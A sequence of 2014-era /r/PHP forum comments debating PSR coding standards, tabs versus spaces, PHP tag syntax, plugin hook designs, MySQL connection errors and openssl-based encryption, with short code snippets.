&gt; These plugins should not have to be registered in a database. This is what Joomla does and they cease to be "plugins" because of it. What is your definition of "plugin"? Is it a small collection of code that just slightly modifies/filters the system's existing behavior? Or is it a larger feature that might need it's own persistence mechanism, like a blog plugin (db tables, cache dir, tmp upload dir)? If it needs its own DB tables, then you'll need more than just plugin discovery (file system scan)...you'll need to handle installation, enabling/disabling features (or the entire plugin), configuration, un-installation, cleanup, etc. How would you handle that without having the plugin get registered in the DB? 
You seem more interested in ranting about hypocrisy than getting an actual answer, but for everyone else interested in this, the reasons a project like Drupal may not conform to all available PSRs can be one or more of the following: * The PSR simply does not apply: the project does not have a feature or component affected by the scope of a PSR * The PSR conflicts with another PSR (e.g. PSR-4 vs. PSR-0) * The PSR was finalized and accepted after a code freeze in the project's release cycle * The PSR would break or degrade the expected functionality of the project * The PSR would place an undue burden on the development ecosystem surrounding a project The last one is why, for example, Drupal does not and will not adopt PSR-2: it has its own coding standards that are internally consistent and changing them now, after 10 years, would require changing a gigantic codebase, updating thousands of hand-written documentation pages, obsoleting large portions of all the books written about Drupal, and creating a major outreach effort to get contributed modules to switch for almost no gain. There is no gain because switching to PSR-2 does not improve Drupal's interoperability with other projects: nobody uses Drupal code outside of Drupal, and when Drupal incorporates code from other projects, it's siloed away from the Drupal-specific code. How is Drupal's situation different from any other project that decided to adopt PSR-2? Because of one or more of the following reasons: * Its codebase and ecosystem are orders of magnitude larger than any other PHP project except WordPress * It already had a perfectly good, clearly defined coding style that has been in place for years. Many projects didn't have that, or had a poorly defined one. * Drupal's community was not convinced by the arguments presented to it for the change. Other communities were more open to change or had better advocates. It's because of situations like this and the reasons above that PSRs are descriptive recommendations, not normative standards: member projects (and, in fact, any PHP project in general) are not obliged in any way to adopt them. Changing it so member projects are required to adopt all applicable PSRs is more likely to lead to many, if not most, of the member projects leaving the group, making discussions about interoperability incredibly difficult. To this end, PSRs should be treated as a Good Idea that should be followed unless you have a cogent reason to do otherwise. Most PHP projects do not have a cogent reason to do otherwise; projects like Drupal, however, do have some good reasons to ignore some of the PSRs. But even gigantic projects like Drupal adopted many of the other PSRs and will continue to do so. 
Not to mention that he's doing a `count()` in both `for` loops - which is not best/standard practice. Doing something as simple as moving the `count()` calls outside the loop and removing the `print_r()` leads to a 700ms exec time on PHP7 (http://3v4l.org/UsI4i) vs nearly 1.4 second on PHP7 with his original code (http://3v4l.org/9jBX5). Mind you he tested with 5.4. $starttime = microtime(true); $array = array(3,4,1,3,5,1,92,2,4124,424,52,12); $array_count = count($array); for ($c=0;$c&lt;100000;$c++) { for ($i=0;$i&lt;$array_count;$i++) { for ($y=0;$y&lt;$array_count-1;$y++) { if ($array[$y+1] &lt; $array[$y]) { $t = $array[$y]; $array[$y] = $array[$y+1]; $array[$y+1] = $t; } } } } echo microtime(true) - $starttime; 
PSR-2 is optional as it's only a style guide. The other PSRs are not required either, but when implemented, should be followed accordingly. I personally disregard PSR-2 as I prefer my own style of syntax. 
&gt; Unfortunately people use the WTFs in their code. Break too many in a single major version and... well you get something like Perl 6 or Python 3. I doubt there are many who use &lt;% and such... Really, I've yet to see a proper PHP book, paper or tutorial that starts off with these alt tags. Also, backward compatibility is a cruel mistress. Damned if you do, damned if you don't. I see new languages popping up with bold claims of superiority... I can't wait to see how they handle tippytoeing around their userbase once newer features start rolling in.
I no longer believe that php can be fixed. Even when I did believe that, I didn't think I had the resources to write RFC's and actually work in the language. As you said working in a Language development is hard. And at that time, I believed that the people who were working in the language are actually smart. But it turned out that every single one of them (those active in /r/php at least) are not much better than the average php, 'wannabe' programmer. Only these guys are 'wannabe' language developers. So I wish you good luck in contributing to the language, and I hope you have fun doing so.
&gt;did these tags (optionally: ever) add any value to the language Possibly the &lt;script&gt; tag was parsed more nicely in older IDEs before they started accommodating PHP. As for ASP tags, I'd like to see the guy who said "I really like PHP, but I just can't stop writing ASP tags!". In 2014, like you said, there is absolutely no need for them. Ditch them all together.
I don't do Job systems in PHP, I'm old school. Cron jobs, some of which fire CLI PHP scripts, etc. So I'm not seeing where the deficiency is really.
I see as interop the ability of *any* developer to be able to contribute to *any* codebase without having to care about reading the coding style guide and the maintainers having to comment the pull request everywhere to say "please put a new line here".
`.` is the concatenation operator in PHP. For example: $x = 'is'; // Just a simple string echo 'what ' . $x . ' love'; // Concatenating (combining) strings //[output]=&gt; 'what is love' Looks to me like OP has an SQL statement as a string in PHP, and a variable is being concatenated into that string.
Wordpress is a hugely popular PHP open source project. Sure it's crap, but that doesn't change anything. I'd say the Google Trends are probably accurate with respect to relative popularity in that case. I'm not saying that "1 like = 1 puppy saved" but I tend to believe that 2,600 stars on github is an indicator that something is fairly popular. Ghost accounts? Maybe, but that's getting into conspiracy territory. I'm trusting GitHub in this case, hopefully they do something to detect and cull that kind of activity. Aside: I hadn't personally heard of owncloud until this post but I checked out their demo and I'm very intrigued. I'm going to peruse some of their code and see what's really up. I think it's entirely possible that the perceived lack of popularity is due to some kind of bubble, maybe it's the tech savvy users rather than modern PHP devs who have latched on to this thing? Seems like an interesting project!
I've been thinking about it some more. I think I have a better handle on why the responder didn't sit well with me, and I'd like to hear your thoughts. The issue is whether the whole of the HTTP response ought to be the responsibility of the view. But I think many of the HTTP headers are messages to the client that the view doesn't need to be concerned with. Should the view know or care about setting cookie headers? Cache control? TTL? Some headers certainly belong to the view, most notably Content-Type, but it doesn't seem like the view needs to care about many others. The fact that view content and client control messages are packaged together into a single HTTP response doesn't necessarily mean the view should be responsible for everything that goes into that package.
There are various ways to inject PHP variables into strings: $name = 'Alfred'; // THE FOLLOWING STATEMENTS ARE EQUIVALENT: echo 'My friend ' . $name . ' is a pirate'; //=&gt; "My friend Alfred is a pirate" echo "My friend $name is a pirate"; //=&gt; "My friend Alfred is a pirate" ?&gt;My friend &lt;?=$name?&gt; is a pirate&lt;?php //=&gt; "My friend Alfred is a pirate" That last one looks funny because we're actually exiting PHP to output the first part ("My friend "), dipping back into PHP to echo `$name`, outputting the second part (" is a pirate"), and then finally re-entering PHP.
well, with that method, scalability is your concern.
It's all about coding styles. SqlQueryBuilder/Builder is because it allows different flavours, therefore different Builders are needed, yet, it's main concept is SQL. 
I don't know if he is against it, but he was doing presentations showcasing PHP as a templating language (with &lt;?php ... and maybe &lt;?= ), and how fast is it without all the stuff those "other" PHP users use (frameworks). And he's got a point, frameworks were fucking atrocious, but that was mostly because PHP had no real support for most of the things they were trying to do. And even though parsing is f-ffking fast in PHP it also has drawbacks (single run lexer-parser-bytecode generator, no optimalizations, harder to provide good syntax errors) and still a waste of resources to reread and reparse every file on every request, recreate objects, routing, load runtime stuff from APC cache, load session (preferably from APC cache, if not found fall back to your proper session store). [[ And then there were the APC don't stat and the realpath cache features, and with the realpath cache you can do atomic updates of sites (because setting the symlink /var/www/blabla.com -&gt; /opt/blabla.com_versions/2014-10-01_12-23-22 to something new would flush the whole cache; but you still have to take care of APC key-value cache data, because there's always a chance of data structure incompatibility). ]] And there are a lot of solutions for many problems in PHP, but the language (and the core runtime) was traditionally very slow to provide these, or catch up at least to the needs and usage patterns of the community.
Can you give me the ELI5 version about what requirement you're hoping to fulfill?
i dont really know, i just wish there was some content for it.... kind of a bad answer, i know. But if i did know, i'd have written something to do it
A more relevant example: $id = 5; $sql_a = 'SELECT butts FROM private WHERE id = ' . $id . ';'; $sql_b = "SELECT butts FROM private WHERE id = $id;"; // Both `$sql_a` and `$sql_b` are equivalent Be warned however, this is very trusting of your variables -- you should sanitize them. If you don't, it leaves you open to malicious attacks. *Security.* These days, it is best practice to use PDO, which allows you to parameterize your transactions. $size = 12; $sql = 'SELECT anus FROM orifices WHERE size &gt; :size'; $params = [ ':size' =&gt; $size ]; $results = $myDBWrapper-&gt;usePDOWithMagic($sql, $params);
&gt; why haven't I heard of this project before? Are they just not active in the PHP community? Or...? Exactly my thought and I have no idea. Maybe it's a geography thing? No idea.
They have different precedence. Not sure if that's a reason to keep them or get rid of them, though. If precedence is unclear, parentheses should be used.
[MySQL error 111 is `connection refused`](http://dev.mysql.com/doc/refman/5.7/en/access-denied.html) PHP can't access the server at all, the remote IP will be the cause. Check over your firewall rules and possibly the binding in the MySQL conf file.
Dude, it's NOT ABOUT COMPLYING TO STANDARDS. It's about trying to improve their ability to work together. The standards are a side affect, not a goal on their own. This makes all the difference, and is why some projects don't follow all the PSR's completely.
The spaces vs tabs thing... Seriously, I want to kick who ever chose spaces in the teeth.
Well considering Drupal had a well documented code style and tools to enforce it long before PSR-2 was in place, you have to deal with "making better software" came before "making prettier software" in the importance for this release.
Good man this guy, I like his syntax. Sin tax applies to OP.
&gt; PSR-2 Is nearly completely worthless if you have been coding in Drupal for any amount of time. It reads like someone took the well written at the time Drupal Style Guide and basically went line by line writing the opposite as a rule. For example Boolean values "true" and "false" must always be uppercase (e.g. TRUE or FALSE) - along comes PSR-2 and chooses the opposite. Literally the only thing that they agreed on was spaces instead of tabs, and both bodies can take a kick in the teeth for that. None of us are using an editor that doesn't allow us to adjust tab size.
The system I use is: If the get_hook function returns a chunk of code for this spot, it gets evaluated. (($hook = get_hook("setup")) ? eval($hook) : false); Or if you don't like eval, you can have the get_hook function return the path to a php file to include. (($hook = get_hook("setup")) ? include($hook) : false); You can get a bit more fancy and support returning values or true or false to prevent doing what is normally done. $hook_result = (($hook = get_hook("setup")) ? eval($hook) : false); if ($hook_result) { } I also have a system so that two or more plugins can use the same hook and you set the order in which they evaluate and terminate so no other plugins that come after get checked.
That's exactly what I suspected as well. I have no access to the MYSQL server in that way. It holds our Remedy db, and I'm just trying to query a ticket outside of Remedy itself. How is his Excel spreadsheet managing to pull data out of the server though? 
There wasn't just a compatibility concern but one with related security implications. If anyone using these tags upgrades straight to PHP 7, their (potentially confidential) code would suddenly be displayed for all users to see. [Read the internals discussion](http://www.serverphorums.com/read.php?7,1020838).
&gt;Literally the only thing that they agreed on was spaces instead of tabs Oh god this. The "tabs" vs "spaces" debate is still raging, and choosing a side like this is beyond stupid.
Thanks for the explanation. I think i'm following what is going on now.
Probably firewall. Boss IP usually has ALLOW EVERYTHING rules. Try pinging the MySQL server. If it pings, try telneting the MySQL server on port 3306 (default MySQL port).
I will totally allow as to how the data for header-related decisions regarding presentation may come from another layer (maybe something high-up in the Domain, perhaps an Application Layer). But if you buy into the concept of the *full entire whole* HTTP response being the thing presented to the client, then the concern being separated out *has* to be the presentation of that response. The presentation layer itself might be divided into different pieces (one for headers and one for body) but the layer itself has to be kept separate. I hope you can see where I'm coming from, even if you don't agree. EDIT: And regarding "client control messages" in the original Smalltalk-80 MVC architecture, where would those have gone? I can't imagine them going anywhere but the View.
That's understandable. Depends how proactive you are able to be about monitoring logs, what kind of solution works best for you or your business, etc. There's lots of factors, and a single solution will not be best for everyone. One benefit of Sentry is its ease of integration. If you use Monolog, there's already a handler built for Sentry (amongst others, of course). And, as /u/-elijah mentioned, it is open source if you are able to maintain your own installation, which I'd like to migrate to at some point for my business.
&gt;&gt; Kill the _GET and _POST and _SERVER arrays and introduce a proper API that can be used to filter all incoming data. &gt; &gt; This is something that OO people keep on insisting on, that PHP NEEDs to have everything in an API to be a 'proper' web-server. Synthetic object-orientation is a common overcompensation for historic PHP constraints. It obviously doesn't always add significant robustness or simplifies code. And indeed binding every triviality in classes just hurts flexibility. Personally I'm using `$_GET-&gt;text-&gt;html["comment"]` etc. for the superglobals. While that's an object behind the scenes, it's by no means an OO interface (really just fluent filter chains). It only happens to be *way* more *convenient* than the `filter_var()` API or any run-of-the-mill framework validation thingy. It still keeps the underlying array accessible, so doesn't get in the way as much as shuffling an all-imposing OO wrapper through polymorphic code paths.
&gt; I hope you can see where I'm coming from, even if you don't agree. Yeah, absolutely. It seems to come down to whether we regard the view as the whole HTTP response that gets delivered to the client software, or as the *portion* of the response that represents what the user will see and interact with on their screen. Both ways of looking at it have merit, I think.
I agree BUT... Let's look at the big players in PHP. Largely they all suck in different ways. They have followings in large part because of the number of libraries or plugins or modules or marklars they have. They maintain their large number by never changing anything meaningful which is a large reason why they all suck. All the new things we love are mostly so awesome because they don't carry that technical debt. What would REALLY happen to the community when PHP7 suddenly can't run WordPress or Drupal or whatever other giant project? It wouldn't be pretty. 
As others mentioned, PSR-2 was designed to help developers work across multiple projects. It's the only one that doesn't break code-based interop. It's simply unrealistic to expect large, established projects to switch for various technical and political reasons that many have mentioned. Where it's really useful is when you start a new project, you don't have to dream up your own coding standards. Use PSR-2 and get back to your project. 
Long before PSR-2 was in place, every project had a ~~well documented~~ code style. That was exactly the problem. They were all different.
Wordpress and Drupal would be forced to adapt - and really if they want to continue to stay relevant they should be adapting right now. Wordpress in particular is an extreme offender that needs to be forced in to moving forward because they won't bother otherwise.
I'll give that a shot. I know he said he had to get special access, but his IP is dynamic (I believe). I'll have him log into my machine in the morning and run his spreadsheet and see if it works.
Is it possible that i can see a chunk of your code ? 
This is a really bad test design. The arrays are sorted on the first pass, then will be in the same sorted order for each subsequent pass.
There are automated tools that would easily convert Drupals code to PSR. It's not really hard, just change some spacing around. To me it seems more based on not wanting to change than there being any technical barrier. So then, let other people, ones actually willing to change things come up with standards. It seems that this is one more thing that PHP once again got backwards: People coming up with standards and ignoring them.
My point is that perhaps those projects should get a deadline to comply or get excluded from FIG altogether.
No, many did not, even large ones with thousands of contributors.
In my experience, an event manager would do the job. Just dispatch an event where you want to hook something (entry point). Combined with by-reference arguments or structured objects to allow the hook to perform what you need.
I'll be there! I'm giving a talk (or 3)... So you can definitely find me (even if you don't want to) :-P
https://github.com/strongloop/express ~16k https://github.com/symfony/symfony ~9k https://www.google.com/trends/explore#q=php%20symfony2%2C%20php%20symfony%2C%20node.js%20express%2C%20javascript%20express%2C%20expressjs just an example, I don't know how to make a less biased search.. would be cool to see a big comparison between stars on GH and the stats on GT
If you kick major members out for not complying to suggested standards, what incentive is there for smaller members? "A Foolish Consistency is the Hobgoblin of Little Minds" That's a header from Python's PEP8. If you don't know, PEP stands for Python Enhancement Proposal. It's like an RFC. PEP8 *is* the Python Style Guide. The entire section (which is the first section after the introduction) says that, "Hey, these are good ideas but you don't *have* to follow them." 
&gt; But MVC itself isn't really healthy to talk about Out of curiosity, what do you mean by this?
I guess you might start including smaller members then? That would by their example show the community how good the standards are. Instead you appoint "benevolent overlords" who come up with rules that they themselves ignore. Actually didn't a lot of the projects that got into the FIG receive a LOT of criticism about how bad their code is: Joomla, SugarCRM, Typo3 .
I'll be there, hopefully giving an uncon talk.
Out of curiosity, does anyone know the reasoning behind adding these tags in the first place? 
Better benevolent overlords than malicious ones. Coding style guidelines are, at the end of the day, *guidelines.* It's unreasonable to expect a project with hundreds of thousands of lines of code to just adopt a new formatting guideline. It's much more complicated than just `:%s/\\\t/ /g`. Existing, solid formatting guidelines should supersede new ones unless an extremely good reason is given. "I'm doing it so they should too" is not a good reason.
I have one question, looking for an answer for a long time. How do you jump to a particular tab in phpstorm? just like sublime text, you can alt+2 to jump to the 2nd tab.
&gt; PHP isnt good at building socket servers. Someone needs some introduction to React! It's like nodejs sockets in PHP :) http://reactphp.org/
&gt; Both ways of looking at it have merit, I think. (/me nods) I assert that the latter way of thinking ("the response that represents what the user will see and interact with on their screen") originates in the original Smalltalk-80 MVC pattern, where the MVC elements coordinated between screen elements. That's why it's so easy to think of *just* the visible portion as being the presentation. Thinking of the whole response as the presentation is the conceptual leap we have to make in the former case, because that's the thing actually being presented by the server to the client.
&gt; Typing. It would be cool if PHP would introduce optional static typing. So that a variable can be declared as, for example, bool or int. An exception should be thrown if used otherwise. My preference would be for a "strict" mode like Javascript or Perl, that forces declaration of all variables along with types. This would include function / method signatures. Don't want it, don't turn on strict mode. Want it, turn it on. Potentially it could be turned on/off at the namespace level, to make transition feasible.
`expand -t4 $file` # problem solved, package maintainers can enforce their tab/space conventions automatically. Make it part of the merge process and be done with it.
agreed.. I'm a tab guy myself.. I use Sublime Text and can switch easily between the two.. I see no reason to enforce one or the other. If I were writing a standard, the only tab vs space requirement would be that no file mixes the two. ie, one file might use spaces, another file might use tabs... but no file may mingle the two
Sure, http://pastebin.com/Y5f6LcHY That is the code that builds the extensions cache from extension.php files. The extension.php files are just filled with functions where the names of which match the context and name of the hook call. My actual hooks look a bit different then the example I gave above. (($hook = $APP-&gt;hook("module:content:mode:item", "setup")) ? (defined('pyncer\cms\EVAL_HOOK') ? eval($hook) : include($hook)) : false); extension.php: function module__content__mode__item__setup() { } You will see some stuff about "scope", cms or website, that's just an extra feature where extensions can be applied to the frontend (website), the backend (cms) or both. Edit: You will see if ($APP-&gt;supports("false_extension_returns")) { The code inside that if and not the else is the newer "better" code, the other code is to support legacy sites only. Here is the $APP-&gt;hook() function http://pastebin.com/Asnj9uHX
I edited my comment above. I doesn't matter if it's not documented, because every project still had a different code style. And (again) that was the problem.
Yeah.......don't think you want to work for a company that only cares about useless trivia.
I like PHPStorm.
"the only thing that they agreed on was spaces instead of tabs, and both bodies can take a kick in the teeth for that. None of us are using an editor that doesn't allow us to adjust tab size." Since we are having a nice rational discussion with reasoned positions, I'll share my counter point. Open putty, and ssh to a Linux box. Open a web browser, and copy a line of code (for example, from Sourceforge). Paste said code into nano/ed/etc. Save. Diff. Notice that your simple copy paste now triggers a diff because tabs don't paste, but spaces do. The FIG actually cites that issue (copy/paste/spaces/tabs) in their discussion of the choice. This is why I have and will continue to support spaces as the correct choice.
Migrating to any of the standards take time. Why? Because we all have full-time jobs and better things to do than to paint bikesheds. CakePHP has been a member for a while, and there are a few reasons we haven't moved everything just yet: - We never used namespaces in the core, so using the autoloader was a bit silly. And we didn't use namespaces because we made the decision to support PHP 5.2 (back when 5.2 was still supported). Our upcoming 3.x version does use namespaces and does follow at least one of the autoloading PSRs. - We've had our own coding style documented for years. It's changed a little, but imagine instantly invalidating everyone's pull requests and internal patches in a minor or patch release. Super fucking lols. We're changing the majority of these in 3.x, but we're sticking to tabs because we still merge our 2.x branch up. You're free to use 7 spaces in your project if you'd like, but we're sticking to our guns where it makes sense. - It's a timesuck. You need to go in and fix every little complaint that the PSR states. Sure, it's our own fault for having a monolithic framework, but frameworks like Laravel and Zend are in the same boat. It's easy to change when your framework/library has ~10 classes and ~3k lines of code, but it's boring work to do that for hundreds of thousands of lines of code. - You need to tell a community of developers that has done it one way that they need to do it all another way without pissing them all off. The members of the PHP-FIG haven't moved in some cases because it's not fun and it's a lot of work. Baby steps. 
In my experience, following the code style of an existing project is not hard. Just *look at the surrounding code*, it will tell you what to do. Any decent editor will detect indentation type and level and match accordingly.
Your question is too broad. Scanning a directory for plugins is the easy part. You need to think about what kinds of things a plugin can do. - Add a new tab somewhere? Put a hook in your "generate tabs" code that checks if any plugins want to register a new tab. - Add some icons to your WYSIWYG editor? Need to put a hook there. - Override some CSS? Need a hook in the code that includes CSS files. Basically, you just need to put hooks everywhere.
There is a lot of code behind Drupal. Getting it to PSR-0 was an accomplishment. If you would like to help push the other PSRs through to Drupal, please open an issue and get involved. Your help would be much appreciated. Without you, it won't happen.
So because you choose to use an inferior editor that can't convert on save, you should force me to have 4 character indentation in all code I use, instead of 2 which I used for close to two decades - when if you used tabs, we could both be happy. By the way, you can configure your random editor of choice in your user account. * http://www.electrictoolbox.com/setting-tab-size-in-nano/ * https://stackoverflow.com/questions/1878974/redefine-tab-as-4-spaces * https://stackoverflow.com/questions/12584465/how-to-maintain-tabs-when-pasting-in-vim We'll never end the holy war, but I'm sorry, the PHP-FIG should not have made a call either way on this topic. If they wanted to go with spaces, 4 is too fucking much because the most widely used frameworks outside of Symfony when they started the discussion all had 2 spaces as the guide. I'm sorry but 80 chars is still the default and when we aren't in our main IDE (where the argument matters, see your example) we are likely to be on a smaller than normal screen, why waste all that space?!
&gt; the only tab vs space requirement would be that no file mixes the two. Which, hilariously, was the most voted for by the community proposal for PSR-2, but the folks in charge literally said "fuck off, we prefer spaces, you will all use them from now on and if you don't like it you can be non-compliant." 
well they're in charge and must know best. right?
&gt; Implemented FR #38409 (parse_ini_file() looses the type of booleans). [#38409](https://bugs.php.net/bug.php?id=38409): &gt; parse_ini_file() function looses the type record for booleans and qualifies them either as an empty string for "false" or 1-char string (containing "1") for "true" instead of qualifying them as booleans So does that mean that there is a BC break? Are "true" and "false" now returned as booleans instead of `"1"`/`""`? *Edit:* Maybe I'm wrong but it seems they added a new constant for `parse_ini_file`: `INI_SCANNER_TYPED`. It doesn't appear in the [documentation](http://fr.php.net/manual/fr/function.parse-ini-string.php) but maybe that new feature is available as an option, so *maybe* there is no BC break.
Stop talking shit.
Is it Monday already?
Me.
I think you guys are no good. I am sure that pisses you off, but that is just my opinion.
Opinions are only worth something if they are backed up by facts. **Yours aren't**, their component parts are just your arrogant whining and bitching about things you don't really understand well enough to say anything truly insightful about. Of course, that's just my opinion; unfortunately for you, my opinions are based on facts. I'm glad you moved to Python, I look forward to a future without you in it.
Well if you need to use the new constant to get the new behavior (and thus not using it keeps the old behavior), then that's fine there should be no BC break.
Haha..facts? Here is [one](http://www.reddit.com/r/PHP/comments/2ejm7c c/rfc_abstract_syntax_tree_ast_accepted_for_php_7/ck05cvt). Let me summaraizes it for you. it was an RFC by nikic proposing to add AST. In it he mentioned that the new change will allow the __clone magic method to be called directly on an object. Do you want his reason for this change? "It does not make sense to me". Yea. that was his reasoning. He had not bothered to look the reasoning why it was done so in the first place. He some how assumed that __clone method was left behind, because it was implemented lastly.. So I pointed out the __clone method was not like other magic methods, because the clone operation calls __clone object of the newly created clone, instead of the original object. So $obj-&gt;__clone() != clone($obj). He hasn't answered that yet. I pointed out to this in another thread. And your response was, &gt; You are a stranger on the internet, Nikita doesn't owe you an explanation of anything. So that are my 'facts' for you. But my opinion is not based on this one incident. It is something that is formed by closely following /r/php and the stuff every one writes, over the last three or four years.. &gt;I'm glad you moved to Python, I look forward to a future without you in it. I moved to python does not means I have stopped working in php. It is just that I ceased to be passionate about working in PHP, and now it is just work. So I no longer care (at least as much as before) what becomes of PHP. but I will be around. Sorry to disappoint you. )`
Fab, thanks! The combination of Meslo and the tweaked VM options have got it looking much nicer :)
Please try to listen ... &gt; $obj-&gt;clone != clone($obj) This is a valid observation, but it's not actually important. Forget how the method behaves, think about the fact that we have a bunch of magic methods that, for various reasons, you are not meant to call. We can do one of two consistent things: * enforce rigidly the rules, magic magic methods only callable by internals * document that magic methods are not intended to be called by userland Those two things would both be perfectly okay, the first might be wasteful and cost us in terms of resources. What we were doing was singling out this one method for special treatment *in some circumstances*, there is actually nothing to stop you calling __clone if you want to in any version of PHP from 5 to 7 and all versions of HHVM. http://3v4l.org/vi0mO I could go for blocking calls *at the level of the executor* to magic methods, I could totally go for that but to single out one method, during *compilation*, to enforce something we don't recognize as a rule for anything else *is strange*.
lol
Thanks. I've googled it but no luck.
Glad I could help! :)
Well, I personally kept out of the discussion because 1) I feel I don't have a deep enough understanding on design patterns to make a proper judgement and 2) it's a naming discussion (important, but not something for everyone to put his 2 cents in). I think [this thread](http://www.reddit.com/r/PHP/comments/1zpm0y/laravel_lets_talk_about_facades) is a great summary of the various reactions in the community.
Do I just post saying me? me!
After having a proper look myself, I've also had no luck finding such an option :( - oh well.
php 6 compiled for windows 9?
This is actually a great idea, but I think it would be more difficult to implement than just introducing proper scalar types.
&gt; This is a valid observation, but it's not actually important. I think it is. Because it lets the same magic method to behave in different manner when used in different contexts. Now, that is inconsistency. Different magic methods behaving differently is not. There is nothing in the definition of magic methods that dictates that every magic method should behave exactly the same. Magic methods are methods that the language code can call as part of handling of an event. That is all. Not allowing to call clone directly does not break consistency. If you think it does, you have a very shallow understanding of the idea of 'consistency'. I mean, that would be like the people complaining that the biggest inconsistency with php is the needle/haystack ordering. &gt;Forget how the method behaves.. Haha..why? This is exactly the kind of thing that I am criticizing on your part. Lack of willingness to take everything into consideration, which is the mark of a novice developer, which is why I called you guys 'wannabe language developers'. &gt;there is actually nothing to stop you calling __clone if you want to.. This is irrelevant. The point is you cannot use the usual semantics to call the clone method... And lastly, it is just sad that I had to cause this much drama to extract a relevant comment from you. 
I'll be there
Good input. Is this an estimate for the stable and official release? If so, beta version could come out sooner right?. I'm really interested to benefit particularly from the said performance gains.
There's been no suggestions on any other dates as far as I'm aware. I don't think they're even thinking about that yet, really. The developers are concentrating on getting all the changes they want into PHP 7. It's a new major version, so it's a big chance to revamp a lot of things, resurrect a lot of ideas that were put off because they were too major or broke backwards compatibility in ways the developers didn't want to do on the 5.x branch, add new major features and have a big cleanup. What they're building is what could be the base for the next 10 years worth of PHP versions (PHP 5.0 came out in July 2004), so they're concentrating on getting things right. That means it'll be done when it's done. I wouldn't be making any plans around any release dates for PHP 7 yet. It's likely to be long haul (many of the internals developers think the 1 year suggested figure is extremely optimistic / rushed). And, it could all fall apart again, like PHP 6 did (it's highly unlikely, but it's still a possibility).
Ah righto. Yep - that makes sense. All clear :)
Of course it's redundant but it is an O(1) operation.
Probably not, I agree that they should be private. Feel free to PR :-)
php 5.4 ... scripted vs compiled vs jit ... bubble sort is not a "real life" application Not accurate at all
Seriously… Find me one editor or IDE that detects any code style… And if you think that's so easy, just implement it yourself.
Yes.
&gt; Actually didn't a lot of the projects that got into the FIG receive a LOT of criticism about how bad their code is That's not even slightly relevant. The point is to get a wide range of projects with different standards to get their input on what a standard could look like. At no point are they obligated to adopt those standards, they aren't even obligated to adopt PSR-0/4. They are suggestions to help compatibility across projects and of all of the suggestions PSR-1/2 are the least important. There is very little motivation to convert a giant project like Drupal from the standards they have been using for years to just suddenly adopt a different code style. If it bothers you that much get an IDE that can easily switch between differing code styles or an editor which understands [editorconfig](http://editorconfig.org/). Code style is per project, it would be nice if we could all suddenly convert to one standard, but it's just not practical. But you are asking a monolith like Drupal to convert everything for the sake of one single developer, that's just not going to happen. The Drupal community wouldn't allow it, and rightly so.
did you try to plug and/or use a JSON API plugin which would return all the necessary information as JSON and then rebuilt your CMS from the JSON API. You would still get your separation of concern without having to use an external server/language. something like this https://wordpress.org/plugins/json-api/
I've been considering buying a Macbook Air recently. I'm not surprised about the performance, all of the videos I've seen it being used on are on OS X. The only thing is - I use Docker, and while Docker does run on OS X, it runs in a VM (at least last I checked) which would negate many of the benefits of using Docker. I could always go back to using VMs I suppose.
For my solution, and most of our customers solution, I think that a general JSON API for Wordpress is the wrong answer. If you write your templates as JSON, you create a very easy to understand data structure, as well as a code base that many developers know already, since it is just another way of writing Wordpress templates. And you end up creating a data specific result, which returns data as you might need it in your front end server. That makes it also easier to change to another CMS if you need to, since the data doesn't follow a specific JSON plugin format. The upsides of using a JSON plugin are, of course, that you don't need to write your JSON templates. On the other hand, writing those templates is the really easy part and follows the Wordpress way 100% (except that you cant use plugins that output data).
Another boring (essentially) copy-paste from the Migration guide in the PHP manual. Half these changes don't even affect most developers (for example, how many people upload &gt;2GB files over HTTP)
Thanks for suggestion. I'll look that up right away!
I suppose that would depend on your server configuration, project configuration etc. Take Symfony as an example, it has a front-controller that handles all requests (`app.php`). That file is a directory called `web/` which is where the public web root *should* be . The folders on the same level as the web folder should be kept hidden, and in most cases probably are. If you're not using something like a front-controller, then it may not be possible. As for security, I suppose realistically it would be more secure to only expose what is necessary for your website to function - i.e. like Symfony, the web directory - while keeping the rest of the source code out of the web root.
best practice these days is to have a public folder where your index or launch file goes, which then autoloads your app which is located outside of that public folder. - MyApp/src : your php - MyApp/public: your launch file and your css/image/assets directories. This is your web root as far as your server is concerned. - MyApp/vendor: composer libraries (you should probably be using composers autoloader in your launch file, it will be located here)
This is a bit dated but [here's an example](http://pastie.org/private/lr8mx647otkjec9517eeta) of a multi subdomain site. Each site can be a little different but principles are as people say. Keep the minimum in docroot. Typically stuff you could put on a CDN.
Terminal: I am too but some stuff is just easier when you're already in the IDE. For local commits it's great. It's also nice to set up Git - even if you don't use it. You can do compares, reverts, etc. And it color codes files and chunks of coded. For pushes, commits, or anything else really I use terminal. The same goes for composer. You don't have to install/update with it but it will parse your project and do some mapping automatically. Honestly, just once go through and set everything up. It adds so much to my productivity. Also search the plugin site for some additional functionality. My personal preference when trying software is to expand as far as I can and then scale back so I can get a complete idea of all the features.
If you do automated testing with phpunit/behat you would have 2 more folders: * MyApp/tests -- phpunit * MyApp/acceptance -- behat These folder should, however, not be deployed to your Web server
So what you're saying really, is Laravel
I suspect the difference in file transfer speed between PHP and NodeJS is due to different file writing implementations, rather than execution speed differences between PHP and C/JS. NodeJS has been designed from the ground up for high speed file transfers, while PHP... has not. NodeJS can (and does) make use of low level system calls (like [sendfile](http://man7.org/linux/man-pages/man2/sendfile.2.html)) to quickly copy a file from/to a disk and a socket, without going through the kernel or using buffers. PHP could come close to that 4 second transfer speed if PHP implemented file transfers the same way, but it doesn't because it's not designed for that type of task.
To be clear, the number of FIG members using spaces vs the number using tabs was 2:1; that is, twice as many "space" styles as "tab" styles. You can see [the original FIG member survey data](https://github.com/php-fig/fig-standards/blob/master/accepted/PSR-2-coding-style-guide.md#a1-survey-data) and [the summarized results](https://github.com/php-fig/fig-standards/blob/master/accepted/PSR-2-coding-style-guide.md#a3-survey-results) on the PSR-2 document.
Most frameworks follow this pattern, only the names change: * src / app / site * public / webroot / web / htdocs * vendor / lib / libraries 
I have a working solution using openssl_seal() and openssl_open(). I'm not sure if there's a better way, but this definitely works. ServerA $keyfile="publickey.pem"; $publickey = openssl_get_publickey(file_get_contents($keyfile)); openssl_seal($json, $msg, $ekeys, array($publickey)); //Write $msg and $ekeys[0] to encrypted.msg and encrypted.key files ServerB - Supply encrypted.msg and encrypted.key files as arguments $keyfile = "private_key.pem" $private_key = openssl_get_privatekey(file_get_contents($keyfile)); $sealed = file_get_contents($argv[1]); $env_key = file_get_contents($argv[2]); // decrypt the data and store it in $open if (openssl_open($sealed, $open, $env_key, $private_key)) { echo $open; } else { echo "failed to decrypt data"; exit (1); } 
